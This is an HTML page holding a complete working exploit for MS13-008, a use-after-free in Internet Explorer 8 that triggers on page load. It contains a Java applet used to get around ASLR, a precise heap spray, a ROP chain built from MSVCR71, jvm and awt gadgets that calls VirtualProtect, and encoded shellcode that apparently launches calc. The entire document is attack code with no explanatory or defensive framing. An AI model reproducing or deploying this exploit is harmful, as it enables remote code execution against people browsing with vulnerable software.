<!doctype html>
<html>
<head>
<applet code="test.class" width=0 height=0></applet> <!-- Load DLL without ASLR thanks to Java 6 -->
<script>

var sprayblocks = new Array();

function prepare_payload()
{
	var add_esp_gadget = unescape("%u45f8%u7c34");  //0x7c3445f8 :  # ADD ESP,2C # RETN    ** [MSVCR71.dll] **  
	var tmp_pad = unescape("%u4141");
	var i = 0;
	var pad = add_esp_gadget
	while (pad.length < 0xDC/2) { // in eax+0xDC+post_pad.length = xchg eax, esp; ret. eax = 0x0c0c0c0c
		pad += tmp_pad;
		i = i + 2;
		if ( i == 0x2C) {
			i = 0;
			pad += add_esp_gadget;
		}
	}
	post_pad = "";
	i = 0;
	while ( i != 16/2) { // extra padding to adjust the stack pivot gadgets
		post_pad += tmp_pad;
		i = i + 1;
	}
	var heap_pivot = unescape("%u8b05%u7c34"); //0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
	var pre_stage = pad + heap_pivot + post_pad;
	var rop_chain =unescape(
    "%u60ec%u6d81" + // 0x6d8160ec : ,# POP EBP # RETN [jvm.dll] 
    "%u60ec%u6d81" + // 0x6d8160ec : ,# skip 4 bytes [jvm.dll]
    "%u6502%u6d08" + // 0x6d086502 : ,# POP EBX # RETN [awt.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%u44d0%u7c34" + // 0x7c3444d0 : ,# POP EDX # RETN [MSVCR71.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%u1f17%u6d0b" + // 0x6d0b1f17 : ,# POP ECX # RETN [awt.dll] 
    "%u541d%u6d12" + // 0x6d12541d : ,# &Writable location [awt.dll]
    "%u6843%u6d0b" + // 0x6d0b6843 : ,# POP EDI # RETN [awt.dll] 
    "%u1e07%u7c35" + // 0x7c351e07 : ,# RETN (ROP NOP) [MSVCR71.dll]
    "%u1e8a%u6d6b" + // 0x6d6b1e8a : ,# POP ESI # RETN [regutils.dll] 
    "%u9e39%u6d6c" + // 0x6d6c9e39 : ,# JMP [EAX] [regutils.dll]
    "%u1877%u6d87" + // 0x6d871877 : ,# POP EAX # RETN [jvm.dll] 
    "%u3280%u6d6d" + // 0x6d6d3280 : ,# ptr to &VirtualProtect() [IAT regutils.dll]
    "%u37da%u6d01" + // 0x6d0137da : ,# PUSHAD # RETN [awt.dll] 
    "%u4ee1%u6d83" + // 0x6d834ee1 : ,# ptr to 'call esp' [jvm.dll]
    ""); //  :
	var shellcode = unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063");
	
	return pre_stage + rop_chain + shellcode
}

function ie8_precise_spray()
{
	payload = prepare_payload()
	
	var beginning = unescape("TEST")
	var junk_start = unescape("%u2020%u2020");
	var junk_end = unescape("%u3030%u3030");
	
	// create large chunk (it's stored in heap, but doesn't matter here). Length doesn't matter.
	while (beginning.length < 0x4000) beginning += junk_start;
	while (junk_end.length < 0x4000) junk_end += junk_end;
	
	// add the padding from block start to our payload (it has to be computed depending on where you jump) 
	offset = ((0x7E8 - 4) / 2); // correct offset. Jumping to 0x08080808
	var junk_front = beginning.substring(0, offset);
	
	// construct one block of 0x2000 bytes
	var junk_end = junk_end.substring(0, 0x2000 - junk_front.length - payload.length)
	var smallblock = junk_front + payload + junk_end;
	//                            ^
	//                            |
	//    0x08080808 -------------+

	// repeat a few times 
	var largeblock = "";
	while (largeblock.length < 0x80000) { largeblock = largeblock + smallblock; }

	// allocate 0x500 times, chunks of 0xFE00 (VirtualMemoryThreshold) * 8 (8 bytes/1 block) = 0x7F000 -> 0x80000
	for (i = 0; i < 0x500; i++) { sprayblocks[i] = largeblock.substring(0, ((0x80000-6)/2)-8);	}
}

function xpl() {

	ie8_precise_spray()

	// Exploit for MS13-008
	
	var e0 = null;
	var e1 = null;
	var e2 = null;

	try {
		e0 = document.getElementById("a");
		e1 = document.getElementById("b");
		e2 = document.createElement("q");
		e1.applyElement(e2);
		e1.appendChild(document.createElement('button'));
		e1.applyElement(e0);
		e2.outerText = "";
		e2.appendChild(document.createElement('body'));
	} catch(e) { }
	CollectGarbage();
	divobj = document.createElement('div');
	// 86 bytes ( + terminating nulls gets added automatically)
	// Total size: 88 bytes (0x58)
	// eax = 0x08080808
	divobj.className = "\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808";
}

</script>
</head>
<body onload="eval(xpl())">
	<form id="a">
	</form>
	<dfn id="b">
	</dfn>
</body>
</html>